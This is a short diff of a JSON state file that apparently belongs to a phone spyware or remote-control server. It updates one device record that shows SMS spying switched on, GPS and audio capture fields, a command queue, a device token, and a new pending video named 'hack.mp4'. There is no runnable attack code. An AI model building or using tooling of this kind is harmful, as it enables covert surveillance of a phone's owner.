@@ -27,7 +27,7 @@
     "deviceName": "TECNO MOBILE LIMITED TECNO LE7",
     "ownerUsername": "Zal Яyuichi",
     "token": "74e1975b32bc12b46b3359426f25ee25",
-    "lastSeen": 1778986144514,
+    "lastSeen": 1778986174907,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-16T09:09:20.775Z",
@@ -44,6 +44,10 @@
     "smsSpyActive": true,
     "lastGps": null,
     "lastAudio": null,
-    "pendingVideo": null
+    "pendingVideo": {
+      "assetPath": "assets/video/hack.mp4",
+      "mimeType": "video/mp4",
+      "startedAt": 1778986147804
+    }
   }
 ]
